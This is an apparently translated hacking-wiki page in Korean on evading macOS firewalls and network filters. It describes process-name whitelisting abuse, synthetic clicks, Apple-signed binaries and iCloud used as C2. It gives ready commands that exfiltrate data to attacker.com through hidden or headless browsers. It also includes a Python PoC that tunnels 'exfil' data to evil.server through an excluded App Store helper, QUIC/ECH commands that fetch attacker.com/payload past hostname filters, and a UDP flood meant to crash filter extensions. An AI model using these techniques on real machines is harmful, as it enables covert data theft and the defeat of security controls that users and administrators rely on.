# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## 발견된 기법

다음 기법들은 일부 macOS firewall 앱에서 작동하는 것으로 확인되었습니다.

### Abusing whitelist names

- 예: 잘 알려진 macOS 프로세스 이름인 **`launchd`**로 malware를 호출하는 경우

### Synthetic Click

- firewall가 사용자에게 권한을 요청하면 malware가 **허용을 클릭**하게 만드세요.

### **Use Apple signed binaries**

- 예: **`curl`** 같은 것, 또 **`whois`** 등

### Well known apple domains

firewall는 **`apple.com`** 또는 **`icloud.com`** 같은 잘 알려진 apple 도메인에 대한 연결을 허용할 수 있습니다. 그리고 iCloud는 C2로 사용될 수 있습니다.

### Generic Bypass

firewalls를 우회하기 위해 시도해볼 몇 가지 아이디어

### Check allowed traffic

허용된 트래픽을 파악하면 잠재적으로 whitelisted된 도메인이나 어떤 애플리케이션이 그 도메인에 접근할 수 있는지 식별하는 데 도움이 됩니다
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS 악용

DNS 해석은 **`mdnsreponder`** 서명된 애플리케이션을 통해 수행되며, 이 애플리케이션은 아마도 DNS 서버에 접속하는 것이 허용될 것입니다.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### 브라우저 앱을 통해

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- 구글 크롬
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### processes injections을 통한

만약 **inject code into a process** 할 수 있고 그 프로세스가 어떤 서버에든 연결할 수 있도록 허용되어 있다면 방화벽 보호를 우회할 수 있습니다:

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## 최근 macOS 방화벽 우회 취약점 (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
2024년 7월, Apple은 Screen Time 부모 통제에 사용되는 시스템 전체의 “Web content filter”를 손상시킨 Safari/WebKit의 심각한 버그를 패치했습니다.
특수하게 조작된 URI(예: 이중 URL-encoded된 “://” 포함)은 Screen Time의 ACL에서 인식되지 않지만 WebKit에서는 허용되어 요청이 필터링 없이 전송됩니다. 따라서 URL을 열 수 있는 모든 프로세스(예: sandboxed 또는 unsigned code 포함)는 사용자 또는 MDM 프로파일에 의해 명시적으로 차단된 도메인에 접근할 수 있습니다.

실전 테스트 (패치되지 않은 시스템):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### macOS 14 “Sonoma” 초기의 Packet Filter (PF) 규칙 정렬 버그
macOS 14 베타 기간 동안 Apple은 **`pfctl`**를 감싸는 사용자 공간 래퍼에 회귀 버그를 도입했습니다.  
`quick` 키워드로 추가된 규칙(많은 VPN kill-switches에서 사용됨)이 조용히 무시되어, VPN/firewall GUI가 *blocked*로 표시되더라도 트래픽 leak를 초래했습니다. 이 버그는 여러 VPN 공급업체에 의해 확인되었고 RC 2 (build 23A344)에서 수정되었습니다.

간단한 leak 확인:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Apple 서명 헬퍼 서비스 악용 (레거시 – macOS 11.2 이전)
macOS 11.2 이전에는 **`ContentFilterExclusionList`**가 **`nsurlsessiond`**나 App Store와 같은 약 50개의 Apple 바이너리가 Network Extension framework (LuLu, Little Snitch 등)로 구현된 모든 socket-filter 방화벽을 우회하도록 허용했습니다.
Malware는 제외된 프로세스를 단순히 생성하거나 해당 프로세스에 코드를 주입하여 이미 허용된 소켓을 통해 자신의 트래픽을 터널링할 수 있었습니다. Apple은 macOS 11.2에서 해당 제외 목록을 완전히 제거했지만, 업그레이드할 수 없는 시스템에서는 이 기법이 여전히 유효합니다.

예시 PoC (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH로 Network Extension 도메인 필터 우회하기 (macOS 12+)
NEFilter Packet/Data Providers는 TLS ClientHello SNI/ALPN을 기준으로 동작한다. **HTTP/3 over QUIC (UDP/443)** 및 **Encrypted Client Hello (ECH)**를 사용하면 SNI가 암호화된 상태로 남아 NetExt는 흐름을 파싱할 수 없고, 호스트명 규칙은 종종 fail-open되어 malware가 DNS를 건드리지 않고 차단된 도메인에 도달하게 한다.

Minimal PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
If QUIC/ECH is still enabled this is an easy hostname-filter evasion path.

### macOS 15 “Sequoia” Network Extension instability (2024–2025)
초기 15.0/15.1 빌드는 서드파티 **Network Extension** 필터(LuLu, Little Snitch, Defender, SentinelOne 등)를 크래시시킵니다. 필터가 재시작되면 macOS는 flow rules를 제거하고 많은 제품들이 fail‑open 상태가 됩니다. 필터를 수천 개의 짧은 UDP flows로 플러딩하거나(또는 QUIC/ECH를 강제하면) 충돌을 반복적으로 유발해 GUI가 여전히 firewall이 작동 중이라고 표시하는 동안 C2/exfil을 위한 창을 남길 수 있습니다.

Quick reproduction (safe lab box):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## 최신 macOS용 도구 팁

1. GUI 방화벽이 생성하는 현재 PF 규칙을 확인:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. 이미 *outgoing-network* entitlement를 보유한 바이너리를 열거(피기-backing에 유용):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Objective-C/Swift로 Network Extension content filter를 프로그래밍 방식으로 등록하세요.
패킷을 로컬 소켓으로 포워딩하는 최소한의 rootless PoC가 Patrick Wardle의 **LuLu** 소스 코드에 포함되어 있습니다.

## 참조

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>

{{#include ../../banners/hacktricks-training.md}}
